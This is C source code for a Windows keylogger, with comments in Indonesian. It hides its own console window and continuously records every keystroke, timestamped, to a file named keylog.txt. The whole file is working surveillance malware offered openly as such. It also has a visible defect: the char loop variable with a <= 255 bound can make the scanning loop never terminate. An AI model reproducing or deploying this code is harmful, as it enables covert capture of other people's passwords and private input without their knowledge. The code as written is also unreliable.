#include <stdio.h>
#include <windows.h>
#include <time.h>

#define KEY_PRESS_STATE -32767

int main() {
	//menghilangkan console windows saat startup
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
	
	FILE *file;
	char pressedKey;
	
	//membuka log file dalam append mode
	file = fopen("keylog.txt", "a");
	if (file == NULL){
		return 1; // keluar jika file tidak ditemukan
	}
	
	fprintf(file, "\n--- KeyLogger di mulai [%u] ---\n", (unsigned)time(NULL));
	fflush(file);
	
	while (1){
		for (pressedKey = 8; pressedKey <= 255; pressedKey++ ){
			
			if (GetAsyncKeyState(pressedKey) == KEY_PRESS_STATE){
				time_t rawtime;
				time(&rawtime);
				
				fprintf(file, "[%u]", (unsigned)rawtime);
				
				switch ((int)pressedKey){
					case ' ':
						fprintf(file, "SPACE\n");
						break;
					case 9:
						fprintf(file, "TAB\n");
						break;
					case 13:
						fprintf(file, "ENTER\n");
						break;
					case 27:
						fprintf(file, "ESC\n");
						break;
					case 8:
						fprintf(file, "BACKSPACE\n");
						break;
					
					default:
					//mencetak karakter standar ASCII yang bisa ditampilkan
					if (pressedKey >= 32 && pressedKey <= 126){
						fprintf(file, "%c\n", pressedKey);
						} else {
							fprintf(file, "CODE_%d\n", pressedKey);
						}
						break;
								
					}
					fflush(file); //memastikan log update seketika
				}
			}
			//mencegah penggunaan CPU berlebih dengan sleep 10 ms
			Sleep(10);
			  
		}
		fclose(file);
		return 0;
	
}